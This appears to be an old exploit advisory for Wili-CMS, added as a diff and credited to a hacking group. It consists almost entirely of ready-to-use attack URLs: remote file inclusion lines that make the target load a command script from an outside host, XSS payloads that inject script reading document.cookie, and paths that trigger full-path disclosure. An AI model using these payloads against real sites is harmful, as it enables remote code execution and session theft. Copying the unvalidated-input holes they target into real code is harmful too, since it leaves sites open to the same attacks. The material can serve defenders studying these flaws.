@@ -1,0 +1,30 @@
+Wili-CMS Multiple Input Validation Vulnerabilities
+
+Discovered By : HACKERS PAL
+Copy rights : HACKERS PAL
+Website : http://www.soqor.net
+Email Address : security@soqor.net
+
+
+Remote include
+example-view/templates/article.php?globals[content_dir]=http://psevil.googlepages.com/cmd.txt?
+example-view/templates/root.php?globals[content_dir]=http://psevil.googlepages.com/cmd.txt?
+example-view/templates/dates_list.php?globals[content_dir]=http://psevil.googlepages.com/cmd.txt?
+
+
+Xss
+http://localhost/vul/wili-cms/relocate.php?<script>alert(document.cookie);</script>
+http://localhost/vul/wili-cms/example-view/inc/print_button.php?globals[pageid]="><script>alert(document.cookie);</script>
+
+
+Full path
+thumbnail.php?filename=global_variables.php
+functions/admin/all.php
+functions/admin/init_session.php
+functions/all.php
+example-view/admin_templates/ any_file.php
+
+and many other Xss and Full path vulnerabilities
+#WwW.SoQoR.NeT
+
+# milw0rm.com [2006-09-21]
